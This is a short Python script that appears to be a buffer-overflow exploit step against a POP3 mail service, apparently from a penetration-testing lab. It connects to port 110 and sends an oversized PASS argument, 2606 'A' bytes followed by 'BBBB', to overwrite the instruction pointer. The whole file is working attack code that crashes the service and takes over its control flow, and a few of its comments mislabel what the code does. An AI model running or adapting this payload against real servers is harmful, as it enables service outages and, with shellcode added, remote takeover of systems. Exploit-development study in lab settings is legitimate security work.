#!/usr/bin/python
import socket
ip = "10.11.15.25"

buf="A"*2606+"BBBB"+"C"*(2700-4-2606)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\nSending evil buffer...")
    s.connect((ip, 110))    # Connect to ip at POP3 port
    data = s.recv(1024)     # receive banner
    print(data)             # print banner
        
    s.send('USER test\r\n') # send username test
    data = s.recv(1024)     # receive banner
    print(data)             # print banner
    
    s.send('PASS '+ buf +'\r\n') # send password test
    data = s.recv(1024)     # receive banner
    print(data)             # print banner

    s.send('QUIT\r\n')      # send quit message
    s.close()               # close socket
    print("\nDone!")
except:
    print("Could not connect to POP3!")
    raise
